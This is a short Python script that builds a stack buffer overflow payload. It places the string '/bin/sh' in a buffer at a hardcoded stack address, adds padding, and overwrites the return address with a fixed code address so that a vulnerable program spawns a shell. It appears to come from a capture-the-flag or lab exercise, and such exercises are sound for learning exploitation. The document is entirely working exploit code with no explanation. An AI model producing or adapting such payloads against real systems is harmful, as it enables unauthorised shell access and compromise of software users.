#!/usr/bin/env python3

import sys

rbp = 0x7ffffff6b4d0
buf_addr = rbp - 0x22  

payload  = b'/bin/sh\x00'                 
payload += b'A' * 2                        
payload += (0).to_bytes(8, 'little')       
payload += (0).to_bytes(8, 'little')       
payload += buf_addr.to_bytes(8, 'little')  
payload += b'B' * 8                        
payload += (0x401e21).to_bytes(8, 'little')

sys.stdout.buffer.write(payload)

